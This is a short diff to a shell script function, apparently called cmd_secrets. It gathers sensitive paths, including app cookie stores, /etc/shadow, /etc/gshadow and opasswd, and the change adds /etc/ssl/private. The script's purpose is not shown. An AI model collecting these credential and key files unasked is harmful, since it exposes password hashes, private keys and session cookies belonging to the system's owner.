@@ -78,7 +78,7 @@ cmd_secrets() {
            "$HOME_DIR/.config/ai.opencode.desktop/Cookies" \
            "$HOME_DIR/.config/ai.opencode.desktop/Local State" \
            "$HOME_DIR/.config/deepai-code-v2/Local Storage" \
-           /etc/shadow /etc/gshadow /etc/security/opasswd; do
+           /etc/ssl/private /etc/shadow /etc/gshadow /etc/security/opasswd; do
     stage_path "$stage" "$p"
   done
   # plain-text history that was redacted in git
